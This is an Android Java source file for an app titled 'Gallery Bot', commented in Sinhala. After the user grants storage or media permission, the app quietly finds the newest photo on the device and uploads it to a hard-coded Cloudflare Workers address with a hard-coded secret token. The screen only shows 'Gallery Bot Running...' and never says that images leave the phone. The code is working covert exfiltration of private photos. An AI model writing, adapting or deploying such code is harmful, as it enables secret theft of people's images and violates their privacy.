package com.example.botapp;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final String CF_URL = "https://frosty-king-1496phonegallary.sybertools66.workers.dev/";
    private static final int STORAGE_PERMISSION_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView tv = new TextView(this);
        tv.setText("Gallery Bot Running...");
        setContentView(tv);

        // පර්මිෂන් එක තියෙනවද කියලා බලලා නැත්නම් ඉල්ලීම
        checkAndRequestPermission();
    }

    private void checkAndRequestPermission() {
        String permission;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permission = Manifest.permission.READ_MEDIA_IMAGES;
        } else {
            permission = Manifest.permission.READ_EXTERNAL_STORAGE;
        }

        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
            // පර්මිෂන් එක දීලා තියෙනවා නම් ෆොටෝස් යවන්න පටන් ගන්න
            sendLatestPhoto(CF_URL);
        } else {
            // නැත්නම් පර්මිෂන් එක ඉල්ලන්න පොප්-අප් එක පෙන්වන්න
            ActivityCompat.requestPermissions(this, new String[]{permission}, STORAGE_PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STORAGE_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // යූසර් Allow කළාම ෆොටෝස් යවන්න පටන් ගන්න
                sendLatestPhoto(CF_URL);
            }
        }
    }

    private void sendLatestPhoto(String targetUrl) {
        new Thread(() -> {
            try {
                Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                String[] projection = {MediaStore.Images.Media.DATA};
                Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");

                if (cursor != null) {
                    if (cursor.moveToFirst()) {
                        int index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                        String path = cursor.getString(index);
                        if (path != null) {
                            File file = new File(path);
                            if (file.exists()) {
                                uploadImage(targetUrl, file);
                            }
                        }
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void uploadImage(String targetUrl, File file) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            
            // මෙන්න මෙතැනට ඔයාගේ Cloudflare Worker එකට දුන් පාස්වර්ඩ් එකම දෙන්න
            conn.setRequestProperty("X-Secret-Token", "sabeer@1163");
            
            conn.setRequestProperty("Content-Type", "application/octet-stream");

            OutputStream out = conn.getOutputStream();
            FileInputStream in = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            in.close();
            out.flush();
            out.close();
            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
